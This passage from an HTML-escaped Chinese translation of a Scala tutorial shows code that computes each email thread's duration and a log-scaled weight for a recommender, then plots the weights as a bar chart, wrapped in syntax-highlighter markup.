				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0012 seconds] --&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/0da5b8de89fe6a8c3538fc79aaaec248.jpg&quot; width=&quot;600px&quot;&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;现在，每个主题的邮件数的取值范围变为 0.69 到 3.41，对推荐系统来说，这比 1 到 29 的范围要好。不过，我们还没有把时间段考虑进去，因此我们回到标准频率上来，着手对数据作变换。为此，我们首先要获取每个邮件会话中，第一个邮件到最后一个邮件的时间间隔：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061375044734234&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
//Create a list of tuples with (subject, list of emails, 
//time difference between first and last email)
//创建一列元组（主题，邮件列表，首末两封邮件的时间间隔）
val mailGroupsWithMinMaxDates = mailsGroupedByThread
 .map(x =&amp;gt; (x._1, x._2,
             (x._2
                .maxBy(x =&amp;gt; x.emailDate)
                .emailDate.getTime - 
             x._2
                .minBy(x =&amp;gt; x.emailDate)
                .emailDate.getTime
                            ) / 1000
              )
      )

//turn into a list of tuples with (topic, list of emails, 
// time difference, and weight) filtered that only threads occur
//转换为一列过滤后的元组（话题，邮件列表，时间间隔，权重），其中只出现邮件对话
val threadGroupedWithWeights = mailGroupsWithMinMaxDates
 .filter(x =&amp;gt; x._3 != 0)
 .map(x =&amp;gt; (x._1, x._2, x._3, 10 + 
                Math.log10(x._2.length.toDouble / x._3)))
 .toArray
 .sortBy(x =&amp;gt; x._4)

val threadGroupValues = threadGroupedWithWeights
 .map(x =&amp;gt; x._4)
val threadGroupDescriptions = threadGroupedWithWeights
 .map(x =&amp;gt; x._1)

//Change the bar plot code to plot this data:
//改变条形图代码以将这些数据绘图
val barPlot = BarPlot.plot(threadGroupValues, threadGroupDescriptions)
barPlot.setAxisLabel(1, &quot;Weighted amount of emails per subject&quot;)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061375044734234-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061375044734234-34&quot;&gt;34&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-1&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Create a list of tuples with (subject, list of emails, &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-2&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//time difference between first and last email)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-3&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//创建一列元组（主题，邮件列表，首末两封邮件的时间间隔）&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-4&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailGroupsWithMinMaxDates&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mailsGroupedByThread&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;maxBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;emailDate&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;emailDate&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;getTime&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;minBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;emailDate&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;emailDate&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;getTime&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1000&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-15&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-16&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//turn into a list of tuples with (topic, list of emails, &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-17&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;// time difference, and weight) filtered that only threads occur&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-18&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//转换为一列过滤后的元组（话题，邮件列表，时间间隔，权重），其中只出现邮件对话&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-19&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadGroupedWithWeights&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mailGroupsWithMinMaxDates&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;log10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-25&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-26&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadGroupValues&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;threadGroupedWithWeights&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-28&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadGroupDescriptions&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;threadGroupedWithWeights&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-31&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Change the bar plot code to plot this data:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061375044734234-32&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//改变条形图代码以将这些数据绘图&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061375044734234-33&quot;&gt;
